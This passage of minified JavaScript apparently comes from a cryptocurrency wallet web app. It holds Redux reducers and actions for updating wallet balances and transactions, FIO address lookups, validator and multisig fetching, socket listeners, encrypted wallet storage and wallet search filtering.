                    (e.hw || hasMultisigByWallet(e) || t) && await a(fetchSubWalletsAndUpdate(e));
                    await e.updateBalance()
                }
            }
        }
          , ku = 18e4
          , Su = 0
          , Cu = 1
          , Nu = Boolean(M.CM && "1" === (0,
        bu.ZP)("disable-background-wallet-updater"))
          , Tu = ee.P.create({
            name: "wallet-updater"
        })
          , rejectionToWarnAndReturnStatus = (e, t) => t.then((e => !1 !== e), (t => {
            console.warn(...e, t);
            return !1
        }
        ))
          , updateWalletsBalanceAndTxs = function(e) {
            let {isCascade: t=!0, balance: a=!0, txs: n=!0} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return r => new Promise((l => {
                window.requestAnimationFrame((async () => {
                    var s;
                    if (!e)
                        return;
                    let i = !1;
                    !0 === a && await rejectionToWarnAndReturnStatus(["updateBalanceByWallet failed", e], r(updateBalanceByWallet(e, t)));
                    let o = !1;
                    e.isNeedUpdateTransactions && !1 !== n && (o = await rejectionToWarnAndReturnStatus(["updateTxsByWallet failed", e], r(updateTxsByWallet(e))));
                    await r(it({
                        wallet: e,
                        statusTxs: o,
                        statusBalance: i
                    }));
                    null != e && null !== (s = e.storeManager) && void 0 !== s && s.updateBalance || r(Ac.Nw.setWalletBalanceUpdateStatus({
                        uuid: e.uuid,
                        apiStatus: Ac.rA.Resolved
                    }));
                    l()
                }
                ))
            }
            ))
        }
          , updateWalletsData = async e => {
            let {wallets: t, walletsQueue: a, options: n, state: r, dispatch: l} = e;
            try {
                if (!(0,
                oe.Oj)(r))
                    return;
                let e = t;
                const s = _s(r)
                  , i = undefined;
                if (!0 === Bo(r)) {
                    n.txs = !1;
                    n.balance = !0
                }
                const supportSocket = e => ro.isCurrencySupported(e.currency);
                n.rest && (e = e.filter((e => !supportSocket(e) || e.data.type === we.uQ.BTC_LIKE_SEGWIT_WALLET)));
                n.socket && (e = e.filter((e => supportSocket(e) && e.data.type !== we.uQ.BTC_LIKE_SEGWIT_WALLET)));
                n.force || (e = e.filter((e => {
                    var t;
                    const a = Wo(r);
                    return null == a || null === (t = a[e.uuid]) || void 0 === t || !t.updateTime || a[e.uuid].updateTime < Date.now() - ku
                }
                )));
                const o = new Map(s.map((e => [e, !0])))
                  , isWalletHidden = e => {
                    var t, a;
                    return !(null === (t = e.data) || void 0 === t || !t.uuid) && o.has(null === (a = e.data) || void 0 === a ? void 0 : a.uuid)
                }
                  , c = e.slice().sort(( (e, t) => isWalletHidden(e) ? 1 : isWalletHidden(t) ? -1 : 0));
                if (Nu) {
                    Tu.log("background wallet updater disabled by dev mode parameter");
                    return
                }
                await Promise.all(c.map((async e => {
                    const t = isWalletHidden(e) ? 0 : 1;
                    await a.add(( () => l(updateWalletsBalanceAndTxs(e, n))), {
                        priority: t
                    })
                }
                )))
            } catch (e) {
                Tu.error("failed to update wallets", e)
            }
        }
          , Au = new wu.default({
            concurrency: 75
        })
          , updateWalletsData_updateAllWallets = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return async (t, a) => {
                const n = undefined;
                if (Boolean(Au.size))
                    return;
                const r = a()
                  , l = $c(r);
                await updateWalletsData({
                    wallets: l,
                    walletsQueue: Au,
                    options: e,
                    state: r,
                    dispatch: t
                })
            }
        }
          , xu = new wu.default({
            concurrency: 75
        })
          , updateSomeWallets = e => {
            let {options: t={}, walletsQueue: a=xu, wallets: n} = e;
            return async (e, r) => {
                const l = undefined;
                Boolean(a.size) || await updateWalletsData({
                    wallets: n,
                    walletsQueue: a,
                    options: t,
                    state: r(),
                    dispatch: e
                })
            }
        }
          , Iu = ["updateInformation", "isBackupInitialized"]
          , Pu = (0,
        te.createReducer)({
            updateInformation: {},
            isAllBalanceUpdating: !1,
            isBackupInitialized: !1
        }).handleAction(it, ( (e, t) => {
            let {payload: {wallet: a, statusTxs: n, statusBalance: r}} = t;
            return {
                updateInformation: {
                    ...e.updateInformation || {},
                    [a.uuid]: {
                        updateTime: Date.now(),
                        statusTxs: n,
                        statusBalance: r
                    }
                },
                isAllBalanceUpdating: e.isAllBalanceUpdating,
                isBackupInitialized: e.isBackupInitialized
            }
        }
        )).handleAction(ot, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                isAllBalanceUpdating: a
            }
        }
        )).handleAction(ct, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                isBackupInitialized: a
            }
        }
        ))
          , Lu = Jn()((async (e, t) => {
            const a = await Promise.all(e.map((async e => {
                const {fio_addresses: a} = await t.requestFIONames({
                    address: e.address
                });
                return {
                    fioAddresses: a,
                    wallet: e,
                    walletUuid: e.uuid
                }
            }
            )));
            return a.filter((e => {
                let {fioAddresses: t} = e;
                return Array.isArray(t)
            }
            ))
        }
        ), {
            cacheKey: e => {
                let[t] = e;
                return t.map((e => e.address)).sort().join()
            }
            ,
            maxAge: 1e4
        })
          , fetchFioAccounts = () => async (e, t) => {
            const a = await Se.Z.getApiByCurrency("fio")
              , n = undefined
              , r = ($c(t()) || {}).filter((e => "fio" === e.currency))
              , l = await Lu(r, a);
            e(So({
                accounts: l
            }))
        }
          , fetchFIOAttachedWallets = (e, t) => async (a, n) => {
            if (!e)
                return;
            const r = n()
              , l = await Se.Z.getApiByCurrency("fio")
              , s = Ao(r)
              , i = await l.requestFIONames({
                address: e.address
            });
            if (!i.fio_addresses || !Array.isArray(i.fio_addresses)) {
                s[e.address] = {};
                a(Co({
                    fioAddressesData: s
                }));
                return
            }
            t || (t = i.fio_addresses[0].fio_address);
            const o = $c(r) || []
              , c = new Set;
            o.forEach((e => {
                "fio" === e.currency || e.currency.includes("testnet") || e.currency.includes("ropsten") || c.add(e.currency)
            }
            ));
            const u = [];
            c.forEach((e => {
                u.push(l.fetchCurrencyAddress({
                    fioAddress: i.fio_addresses[0].fio_address,
                    currency: e
                }))
            }
            ));
            const d = await Promise.all(u.map((e => e.catch((e => e)))))
              , m = {};
            for (let e = 0; e < [...c].length; e += 1)
                d[e]instanceof Error || (m[[...c][e]] = d[e].address);
            const p = Ao(r) || {};
            p[t] = m;
            a(Co({
                fioAddressesData: p
            }));
            return m
        }
          , fetchAllFIOInfo = () => async (e, t) => {
            const a = undefined;
            if (!0 === Bo(t()))
                return;
            e(fetchFioAccounts());
            const n = undefined
              , r = ($c(t()) || {}).filter((e => "fio" === e.currency));
            for (const t of r)
                await e(fetchFIOAttachedWallets(t));
            return !0
        }
          , setPendingAccount = (e, t, a, n, r) => async (l, s) => {
            const i = Io(s());
            i[e] = {
                walletUuid: n.uuid,
                fioAddress: {
                    fio_address: e
                },
                name: t,
                wallet: {
                    uuid: n.uuid,
                    address: n.address
                },
                domain: a,
                pending: !0,
                paymentId: r
            };
            l(ko({
                pendingAccounts: i
            }))
        }
          , confirmPendingAccount = e => async (t, a) => {
            const n = Io(a());
            delete n[e];
            t(ko({
                pendingAccounts: n
            }));
            await t(fetchFioAccounts())
        }
          , Fu = {
            setExchangeCurrencies: (0,
            te.createAction)(Ts)(),
            fetchExchangeCurrencies: (0,
            te.createAction)(As)(),
            setExchangePartner: (0,
            te.createAction)(Is)(),
            setExchangeCaptcha: (0,
            te.createAction)(Ps)(),
            setAllTokens: (0,
            te.createAction)(Ls)(),
            fetchAllTokens: (0,
            te.createAction)(Fs)(),
            createTransaction: (0,
            te.createAction)(Ws)(),
            createOrderInfoG: (0,
            te.createAction)(Rs)(),
            setOrderInfo: (0,
            te.createAction)(Os)(),
            setOrderError: (0,
            te.createAction)(Ds)(),
            setFailedFetchEstimate: (0,
            te.createAction)(xs)(),
            setExchangeTransaction: (0,
            te.createAction)(Bs)(),
            setExchangeError: (0,
            te.createAction)(Ms)(),
            fetchExchangeTransaction: (0,
            te.createAction)(Us)(),
            createDusterInvoice: (0,
            te.createAction)(Gs)(),
            setDusterInvoice: (0,
            te.createAction)(Vs)(),
            setIsApplyableForDustRequest: (0,
            te.createAction)(Ks)(),
            setMainPageStep: (0,
            te.createAction)(Hs)(),
            setWalletTo: (0,
            te.createAction)(zs)(),
            setWalletFrom: (0,
            te.createAction)(js)(),
            addExchangeStatusToHistory: (0,
            te.createAction)(Zs)(),
            resetExchangeStatusToHistory: (0,
            te.createAction)(Ys)(),
            setIsFetchingExchangeUpdateTx: (0,
            te.createAction)(qs)(),
            setSendAssetsResponse: (0,
            te.createAction)(Js)(),
            createExchangeAssetsList: (0,
            te.createAction)(Xs)(),
            setExchangeAssetsList: (0,
            te.createAction)(Qs)(),
            setClearExchangeStore: (0,
            te.createAction)(ei)(),
            initializeTokenInfoUpdater: (0,
            te.createAction)(ti)(),
            fetchExchangeInfo: (0,
            te.createAction)(ai)(),
            setExchangeInfo: (0,
            te.createAction)(ni)(),
            fetchTotalGethBalance: (0,
            te.createAction)(Ni)(),
            setTotalGethBalance: (0,
            te.createAction)(Ti)(),
            setAmount: (0,
            te.createAction)(ri)(),
            setLastCurrenciesFetched: (0,
            te.createAction)(li)()
        };
        var Wu = a(52084)
          , Ru = a(53972);
        const Bu = {}
          , Ou = "@notify/ADD_BACKUP_NOTIFY"
          , Du = "@notify/REMOVE_BACKUP_NOTIFY"
          , Mu = "backup-notify"
          , Uu = (0,
        Ru.Z)({
            [Ou]: e => ({
                ...e,
                isBackupNotify: !0
            }),
            [Du]: e => ({
                ...e,
                isBackupNotify: !1
            })
        }, Bu)
          , selectedBackupNotify = e => !!e["backup-notify"] && !!e["backup-notify"].isBackupNotify
          , addNotifyBackup = () => e => e({
            type: Ou
        })
          , removeNotifyBackup = () => e => e({
            type: Du
        })
          , Gu = {}
          , Vu = "@notify/NEW_VERSION_AVAILABLE_NOTIFY"
          , Ku = "new-version-notify"
          , Hu = (0,
        Ru.Z)({
            [Vu]: e => ({
                ...e,
                isNewVersionAvailable: !0
            })
        }, Gu)
          , selectedNewVersionAvailableNotify = e => !!e["new-version-notify"] && !!e["new-version-notify"].isNewVersionAvailable
          , zu = (0,
        te.createAction)("@atom/validators/SET_VALIDATORS")()
          , ju = "@atom/validators"
          , $u = {
            validators: []
        }
          , Zu = (0,
        te.createReducer)($u).handleAction(zu, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , selectedValidators = e => e["@atom/validators"].validators || []
          , fetchValidators = () => async (e, t) => {
            const a = t()
              , n = Bo(a);
            if (selectedValidators(a).length || !0 === n)
                return;
            const r = await Se.Z.loadLightAdapterByWallet({
                currency: "atom"
            });
            if (!r)
                return;
            const l = await r.getValidators()
              , s = l.reduce(( (e, t) => (0,
            Ko.PD)(e, t.tokens).toString()), "0")
              , i = l.map((e => {
                const t = (0,
                Ko.FH)((0,
                Ko.$q)((0,
                Ko.hC)(e.tokens, s).toString(), 100), {
                    max: 2
                })
                  , a = (0,
                Ko.FH)((0,
                Ko.$q)(parseFloat(e.commission.commission_rates.rate.toString()), 100), {
                    max: 2
                });
                return {
                    id: e.operator_address,
                    title: e.description.moniker,
                    subtitle: `Fee: ${a}%`,
                    address: e.operator_address,
                    power: t,
                    rate: a,
                    original: e
                }
            }
            )).sort(( (e, t) => parseFloat(t.power) - parseFloat(e.power)));
            await e(zu({
                validators: i
            }))
        }
          , Yu = (0,
        te.createAction)("@wallets/SET_BALANCE")()
          , qu = (0,
        te.createAction)("@wallets/SET_MULTISIGS")()
          , Xu = (0,
        te.createAction)("@wallets/SET_ACTIVE_WALLET_ID")()
          , Qu = (0,
        te.createAction)("@wallets/SET_WALLETS_BALANCES_UPDATED_BY_REST")()
          , Ju = (0,
        te.createAction)("@wallets/SET_WALLETS_TXS_UPDATED_BY_REST")()
          , ed = (0,
        te.createAction)("@wallets/CLEAR_UPDATED_BY_REST_DATA")()
          , td = (0,
        te.createAction)("@wallets.FETCH_TRX_RESOURCES")()
          , ad = (0,
        te.createAction)("@wallets.FETCH_TRX_RESOURCES.IN_PROGRESS.COMMIT")()
          , nd = (0,
        te.createAction)("@wallets.FETCH_TRX_RESOURCES.COMMIT")()
          , rd = {
            createTop10Currencies: (0,
            te.createAction)("@wallets.createTop10CurrenciesCase")(),
            stopCreatingWallets: (0,
            te.createAction)("@wallets.stopCreatingWallets")(),
            createWallet: (0,
            te.createAction)("@wallets.createWallet")(),
            setIsLoadingCreatingWallet: (0,
            te.createAction)("@wallets.setIsLoadingCreatingWallet.COMMIT")(),
            setNewCreatedWalletId: (0,
            te.createAction)("@wallets.setNewCreatedWalletId.COMMIT")(),
            replaceWallets: (0,
            te.createAction)("@wallets.replaceWallets")(),
            replaceWalletsCommit: (0,
            te.createAction)("@wallets.replaceWalletsCommit.COMMIT")(),
            mergeWallets: (0,
            te.createAction)("@wallets.mergeWallets")(),
            removeWallet: (0,
            te.createAction)("@wallets.removeWallet")(),
            updateWallet: (0,
            te.createAction)("@wallets.updateWallet")(),
            addWallet: (0,
            te.createAction)("@wallets.addWallet")(),
            setWalletsMnemonic: (0,
            te.createAction)("@wallets.setWalletsMnemonic")(),
            setErrorCreatingWallet: (0,
            te.createAction)("@wallets.ErrorCreatingWallet")()
        }
          , mapDecryptedSecureStorage = e => (t, a) => {
            const n = a()
              , r = (0,
            oe.A0)(n)
              , l = (0,
            oe.P2)(n);
            if (!r)
                return;
            const s = e(r)
              , i = Q.AES.encrypt(JSON.stringify(s), l).toString();
            t(ie.storageSaveAndTryFlush({
                data: i
            }))
        }
          , mergeWalletsIntoSecureStorage = e => (t, a) => mapDecryptedSecureStorage((a => {
            const n = a.wallets.slice()
              , r = new Set(a.wallets.map((e => e.address)));
            for (const t of e)
                if (!r.has(t.address)) {
                    n.push(t);
                    r.add(t.address)
                }
            t(rd.replaceWalletsCommit({
                newWallets: n
            }));
            return {
                ...a,
                wallets: n
            }
        }
        ))
          , ld = "wallets"
          , sd = ["activeWalletId", "balances", "multisigs"]
          , id = ee.P.create({
            name: "reducer-wallets"
        })
          , od = {
            wallets: [],
            walletAdditionalInfo: {},
            multisigs: [],
            activeWalletId: null,
            balances: {},
            walletsUpdatedBalancesByRest: {},
            walletsUpdatedTxsByRest: {},
            isLoadingCreatingWallet: !1,
            newCreatedWalletId: null,
            errorCreatingWallet: void 0,
            walletsMnemonic: null,
            isStopCreatingWallets: !1
        }
          , cd = (0,
        te.createReducer)(od).handleAction(ad, ( (e, t) => {
            var a;
            let {payload: {walletId: n}} = t;
            return {
                ...e,
                walletAdditionalInfo: {
                    ...e.walletAdditionalInfo,
                    [n]: {
                        type: we.uQ.TRX_WALLET,
                        uuid: n,
                        loading: !0,
                        resources: (null === (a = e.walletAdditionalInfo[n]) || void 0 === a ? void 0 : a.resources) || {
                            netLimit: "NaN",
                            netUsed: "NaN",
                            netAvailable: "NaN",
                            energyLimit: "NaN",
                            energyUsed: "NaN",
                            energyAvailable: "NaN"
                        }
                    }
                }
            }
        }
        )).handleAction(nd, ( (e, t) => {
            let {payload: {uuid: a, resources: n}} = t;
            return {
                ...e,
                walletAdditionalInfo: {
                    ...e.walletAdditionalInfo,
                    [a]: {
                        type: we.uQ.TRX_WALLET,
                        uuid: a,
                        loading: !1,
                        resources: n
                    }
                }
            }
        }
        )).handleAction(rd.replaceWalletsCommit, ( (e, t) => {
            let {payload: {newWallets: a}} = t;
            return {
                ...e,
                wallets: a
            }
        }
        )).handleAction(Yu, ( (e, t) => {
            let {payload: {id: a, balance: n}} = t;
            return {
                ...e,
                balances: {
                    ...e.balances,
                    [a]: n
                }
            }
        }
        )).handleAction(qu, ( (e, t) => {
            let {payload: {multisigs: a}} = t;
            return {
                ...e,
                multisigs: a
            }
        }
        )).handleAction(Xu, ( (e, t) => {
            let {payload: {activeWalletId: a}} = t;
            return {
                ...e,
                activeWalletId: a
            }
        }
        )).handleAction(Qu, ( (e, t) => {
            let {payload: {walletId: a}} = t;
            const n = e.walletsUpdatedBalancesByRest || {};
            return {
                ...e,
                walletsUpdatedBalancesByRest: {
                    ...n,
                    [a]: !0
                }
            }
        }
        )).handleAction(Ju, ( (e, t) => {
            let {payload: {walletId: a}} = t;
            const n = e.walletsUpdatedTxsByRest || {};
            return {
                ...e,
                walletsUpdatedTxsByRest: {
                    ...n,
                    [a]: !0
                }
            }
        }
        )).handleAction(rd.setIsLoadingCreatingWallet, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                isLoadingCreatingWallet: a
            }
        }
        )).handleAction(ed, (e => ({
            ...e,
            walletsUpdatedTxsByRest: {},
            walletsUpdatedBalancesByRest: {}
        }))).handleAction(ne, ( () => od)).handleAction(rd.setNewCreatedWalletId, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                newCreatedWalletId: a.walletId
            }
        }
        )).handleAction(rd.setErrorCreatingWallet, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                errorCreatingWallet: a.message
            }
        }
        )).handleAction(rd.setWalletsMnemonic, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                walletsMnemonic: a
            }
        }
        )).handleAction(rd.stopCreatingWallets, (e => ({
            ...e,
            isStopCreatingWallets: !0
        })))
          , ud = new Map
          , removeWalletSocketListeners = e => {
            const t = ud.get(e.uuid);
            t && t instanceof WebSocket && ud.delete(e.uuid)
        }
          , setWalletBalancesWereUpdatedByRest = e => Qu({
            walletId: e
        })
          , setWalletTxsWereUpdatedByRest = e => async t => {
            t(Ju({
                walletId: e
            }))
        }
        ;
        ft.on("logout", (async e => {
            let {dispatch: t} = e;
            ro.disconnect("logout");
            t(ed());
            t(rd.replaceWallets({
                newWallets: []
            }))
        }
        ));
        const fetchMultisigs = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!0 === Bo(a()) && !1 === e)
                    return;
                const l = $c(n);
                if (!l || 0 === l.length)
                    return;
                const s = l.filter((e => !!e.publicKey || e.type === we.uQ.ETH_LIKE_WALLET))
                  , i = l.flatMap((e => e.subWallets)).filter((e => e.type === we.aO.ERC20_TOKEN));
                s.push(...i);
                if (s && s.length)
                    try {
                        const {data: e} = await U.nW.post("/api/v1/internal/multisigs", {
                            addresses: s.map((e => e.publicKey ? [e.currency, e.publicKey] : [e.currency, e.address]))
                        });
                        if (e.response) {
                            const a = e.response.filter((e => e.walletType === we._h.BITCOIN))
                              , n = e.response.filter((e => e.walletType === we._h.ETHEREUM));
                            for (let e = 0; e < n.length; e += 1)
                                try {
                                    const t = n[e];
                                    n[e].transactionHash = t.walletAddressData;
                                    const a = await Se.Z.getApiByMultisig(t)
                                      , r = await a.getMultisigAddress(t.walletAddressData);
                                    n[e].walletAddressData = r || "";
                                    if (r) {
                                        const e = t.participants.map((e => e.data));
                                        t.smartContract ? await a.verifyMultisigTokenSourceCode(t.family, "token", r, t.minimumSigAmount, e, t.smartContract) : await a.verifyMultisigTokenSourceCode(t.family, "coin", r, t.minimumSigAmount, e)
                                    }
                                } catch (e) {}
                            t(qu({
                                multisigs: n.concat(a)
                            }))
                        }
                    } catch (e) {
                        console.warn(e)
                    }
            }
        }
          , setBalanceByWallet = e => async (t, a) => {
            try {
                const n = undefined
                  , r = a().wallets.balances || {};
                Number.isNaN(parseFloat(e.balance)) || r[e.uuid] === e.balance || t(Yu({
                    lockedBalance: e.lockedBalance,
                    balance: e.balance,
                    id: e.uuid
                }))
            } catch (e) {
                id.error("setBalance reducer failed", e)
            }
        }
          , setActiveWallet = e => async t => {
            if (!e)
                throw new Error("wallet is undefined");
            t(Xu({
                activeWalletId: e.uuid
            }))
        }
          , mapWalletsToPlainObjects = e => {
            try {
                const t = [];
                e.forEach((e => {
                    if (_e.ZP.isSupported(e) && e instanceof to.Z) {
                        const a = e.mapToPlainObject();
                        t.push(a)
                    } else
                        t.push(e)
                }
                ));
                return t
            } catch (e) {
                id.error("mapWalletsToPlainObjects", e);
                return []
            }
        }
          , setSecureWallets = e => async t => {
            try {
                const a = mapWalletsToPlainObjects(e);
                return t(mergeWalletsIntoSecureStorage(a))
            } catch (e) {
                id.error("setSecureWallets reducer failed", e);
                return !1
            }
        }
          , replaceWalletsFromWalletModels = e => t => {
            try {
                return t(rd.replaceWalletsCommit({
                    newWallets: e
                }))
            } catch (e) {
                id.error("replaceWalletsFromWalletModels reducer failed", e);
                return
            }
        }
          , replaceAllWallets = e => async t => {
            await t(setSecureWallets(e));
            t(replaceWalletsFromWalletModels(e))
        }
          , addSubWallet = (e, t) => async (a, n) => {
            const r = $c(n())
              , l = e.subWallets.find((e => e.smartContract === t.smartContract));
            if (l)
                return l;
            const s = await e.addSubWallet(t)
              , i = [];
            r.forEach((e => {
                e.subWallets && e.subWallets.length > 0 && i.push(...e.subWallets)
            }
            ));
            i.push(t);
            a(rd.updateWallet({
                wallet: e
            }));
            return s
        }
          , triggerSaveWallets = () => async (e, t) => {
            const a = $c(t());
            await e(replaceAllWallets(a));
            await e(removeNotifyBackup())
        }
          , fetchSubWalletsAndUpdate = e => async t => {
            try {
                const a = undefined;
                await e.fetchSubWallets() && t(rd.updateWallet({
                    wallet: e,
                    options: {
                        isSilent: !0
                    }
                }))
            } catch (e) {
                id.error("fetchSubWalletsAndUpdate reducer failed", e)
            }
        }
          , setWalletSocketListeners = e => async t => {
            try {
                if (!e.isUpdatableBySocket || !e.isSocketUniqInstance)
                    return;
                const updateConnection = async (e, t) => ud.set(e.uuid, t)
                  , updateTransactions = async (e, a) => t(setTransactions(e, a))
                  , commitWalletUpdate = async e => t(rd.updateWallet({
                    wallet: e
                }))
                  , updateBalance = async e => {
                    await t(setBalanceByWallet(e));
                    for (const a of e.subWallets)
                        await t(setBalanceByWallet(a))
                }
                ;
                if (e instanceof Wu.Z) {
                    const t = await e.installSocketHook({
                        commitWalletUpdate,
                        updateBalance,
                        updateTransactions,
                        updateConnection
                    });
                    ud.set(e.uuid, t)
                }
            } catch (e) {
                id.error("setWalletSocketListeners reducer failed", e)
            }
        }
          , startSocketManager = () => async (e, t) => {
            const a = undefined;
            if (!0 !== Bo(t())) {
                e(Fu.fetchAllTokens());
                e(Fu.fetchExchangeCurrencies());
                ro.disconnect();
                ro.setWalletsAccessor({
                    walletsAccessor: () => $c(t())
                });
                ro.setNewVersionEventHandler(( () => e({
                    type: Vu
                })));
                ro.connect()
            }
        }
          , setWalletsSocketListeners = () => async (e, t) => {
            ud.clear();
            const a = $c(t());
            e(startSocketManager());
            a.forEach((t => {
                e(setWalletSocketListeners(t))
            }
            ))
        }
          , bulkAddWallets = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return async (a, n) => {
                try {
                    e = initializeWalletsModels(e);
                    const r = $c(n()) || [];
                    for (const t of e) {
                        r.push(t);
                        const e = undefined;
                        ud.get(t.uuid) || a(setWalletSocketListeners(t))
                    }
                    !0 !== t.isSilent && await a(addNotifyBackup());
                    const l = [];
                    e.forEach((e => {
                        e.subWallets && e.subWallets.length > 0 && l.push(...e.subWallets)
                    }
                    ));
                    const s = undefined;
                    e.find((e => "atom" === e.currency)) && a(fetchValidators());
                    a(replaceWalletsFromWalletModels(r));
                    a(fetchMultisigs());
                    a(startSocketManager())
                } catch (e) {
                    id.error("bulkAddWallets reducer failed", e)
                }
            }
        }
          , bulkUpdateWallets = e => async (t, a) => {
            const n = $c(a())
              , findWallet = e => n.find((t => e.uuid === t.uuid));
            for (const t of e)
                try {
                    const e = findWallet(t);
                    if (!t || !e)
                        throw new Error("wallet or foundWallet is undefined");
                    Object.assign(t, patchWalletTitle(t));
                    Object.assign(e, t)
                } catch (e) {
                    id.error("updateWallet reducer failed", e)
                }
            await t(replaceAllWallets(n))
        }
          , restoreWallets = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return async (a, n) => {
                try {
                    if (!e)
                        throw new Error("plainWallets are undefined");
                    const r = initializeWalletsModels(e);
                    if (t.isReplace) {
                        await a(replaceAllWallets([...r]));
                        return
                    }
                    const l = []
                      , s = []
                      , i = n();
                    r.forEach((e => {
                        const t = undefined;
                        au(i)(e.address, e.currency) ? s.push(e) : l.push(e)
                    }
                    ));
                    s.length && await a(bulkUpdateWallets(s));
                    await a(bulkAddWallets(l, {
                        isSilent: !0
                    }))
                } catch (e) {
                    id.error("restoreWallets reducer failed", e)
                }
            }
        }
          , _addWallet = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return async (a, n) => {
                try {
                    const r = $c(n());
                    Object.assign(e, patchWalletTitle(e, r));
                    r.push(e);
                    await a(setSecureWallets(r));
                    t && !0 === t.isSilent || await a(addNotifyBackup());
                    await e.fetchSubWallets();
                    a(setWalletSocketListeners(e));
                    a(startSocketManager());
                    a(fetchAllFIOInfo());
                    a(fetchMultisigs());
                    return !0
                } catch (e) {
                    id.error("addWallet reducer failed", e);
                    return !1
                }
            }
        }
          , saveWalletsWithPassword = e => async (t, a) => {
            try {
                const n = $c(a())
                  , r = mapWalletsToPlainObjects(n);
                await t(ie.setMasterPassword({
                    masterPassword: e
                }));
                await t(setSecureData(ze, r))
            } catch (e) {
                id.error("saveWalletsWithPassword reducer failed", e)
            }
        }
          , getNewAccountIndexCoin = e => {
            var t, a;
            let {currency: n, backupWallets: r} = e;
            const l = r.filter((e => e.currency === n && !(null == e || !e.derivedFromMnemonicUsing))).sort(( (e, t) => {
                var a, n;
                return ((null === (a = t.derivedFromMnemonicUsing) || void 0 === a ? void 0 : a.accountIndex) || -1) - ((null === (n = e.derivedFromMnemonicUsing) || void 0 === n ? void 0 : n.accountIndex) || -1)
            }
            ))
              , s = null == l || null === (t = l[0]) || void 0 === t || null === (a = t.derivedFromMnemonicUsing) || void 0 === a ? void 0 : a.accountIndex;
            return null == s ? 0 : s + 1
        }
          , getNewTitleCoin = e => {
            let {currency: t, backupWallets: a} = e;
            const n = a.filter((e => e.currency === t))
              , r = (null == n ? void 0 : n.length) || 0;
            return r && 0 !== r ? r + 1 : 0
        }
          , getNewTitleIndexToken = e => {
            let {currency: t, backupWallets: a} = e;
            const n = a.reduce(( (e, a) => [...e, ...a.subWallets.filter((e => (0,
            Ho.t)(e.currency) === (0,
            Ho.t)(t)))]), [])
              , r = (null == n ? void 0 : n.length) || 0;
            return r && 0 !== r ? r + 1 : 0
        }
        ;
        function wallets_util_isMultisig(e) {
            return Boolean(e && "object" == typeof e && "multisigId"in e)
        }
        const dd = ["eth", "trx", "bnb", "ada", "btc", "ont", "etc", "ethw", "bsc", "dot", "hbar", "ltc", "xdc", "doge", "xlm", "matic", "algo", "yec", "ada-shelley", "ksm", "near", "vet", "clo", "waves", "vtc", "ubq", "bsv", "sol", "avax", "exp", "grs", "btg", "rvn", "one", "zil", "kmd", "qtum", "crm", "dgb", "xno", "dash", "xtz", "egld", "eos", "firo", "rdd", "atom", "bch", "zen", "xem", "xrp", "luna", "xvg", "dcr", "btcv", "aya", "ethop", "etharb", "xmr", "inj", "coreum", "ton", "kas", "bera", "bone"];
        var md = a(63150)
          , pd = a.n(md);
        const searchIncludes = e => {
            const t = String(e || "").trim();
            let a;
            a = "bnb" === t.toLowerCase() ? "(bnb|bsc)" : pd()(t);
            return new RegExp(a,"ig")
        }
          , get_reg_exp_from_search = e => {
            e = String(e || "").trim();
            const t = escapeStringRegexp(e);
            return /^\s*$/.test(t) ? new RegExp(/^\b$/) : new RegExp(`(?=.*(?:^|\\W)${t})`,"ig")
        }
          , walletOrSubwalletSearchStrings = e => {
            const t = [e.currency];
            t.push(e.address);
            t.push(e.title);
            const a = (0,
            be.II)(e.currency);
            null != a && a.title && t.push(a.title);
            return t
        }
          , walletSearchText = (e, t) => {
            let {withoutSubwallets: a} = t;
            const n = [];
            a && e.isSubWallet || n.push(...walletOrSubwalletSearchStrings(e));
            if (!a)
                for (const t of null !== (r = null == e ? void 0 : e.subWallets) && void 0 !== r ? r : []) {
                    var r;
                    n.push(...walletOrSubwalletSearchStrings(t))
                }
            null != e && e.legacyAddress && n.push(e.legacyAddress);
            return n.join(" ")
        }
          , currencySearchText = e => [e.ticker, e.title, e.family].join(" ")
          , filter = function(e, t, a) {
            let {withoutSubwallets: n=!1} = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
            if (!a)
                return e;
            const r = a.toLocaleLowerCase().replace(/\s+/g, " ").trim();
            let l = r.split(" ")
              , s = null;
            const i = e.filter((e => {
                var a;
                let i = t(e, {
                    withoutSubwallets: n
                }).toLocaleLowerCase()
                  , o = null !== (a = null == e ? void 0 : e.family) && void 0 !== a ? a : null;
                s = null;
                const c = l.filter((e => {
                    if ((e = "bnb" === e ? "bsc" : e) === o) {
                        s = o;
                        return !1
                    }
                    return !0
                }
                ));
                if (null !== s)
                    return -1 !== i.search(searchIncludes(c.join(" ")));
                if (-1 !== i.search(searchIncludes(r))) {
                    const e = i.split(" ");
                    let t = 0;
                    for (let a = 0; a < e.length; a++)
                        if (e[a].length > 0 && e[a].includes(r)) {
                            const n = r.length / e[a].length;
                            n > t && (t = n)
                        }
                    return t > .3
                }
                return !1
            }
            ));
            return i
        }
          , filterWallets = (e, t, a) => filter(e, walletSearchText, t, a)
          , filterCurrencies = (e, t) => filter(e, currencySearchText, t)
          , fd = "sort/balance"
          , Ed = "sort/az"
          , hd = "sort/rank"
          , gd = fd
          , yd = "@cache/SAVE_CACHE_KEY"
          , vd = {
            cache: {}
        }
          , _d = "cache"
          , wd = ["cache"]
          , bd = (0,
        Ru.Z)({
            [yd]: (e, t) => {
                let {key: a, value: n} = t;
                return {
                    ...e,
                    cache: {
                        ...e.cache || {},
                        [a]: n
                    }
                }
            }
            ,
            CLEAR_ALL_DATA: () => ({
                ...vd
            })
        }, vd)
          , selectedCache = e => e[_d].cache || {}
          , setCacheKey = (e, t) => a => {
            a({
                type: yd,
                key: e,
                value: t
            })
        }
        ;
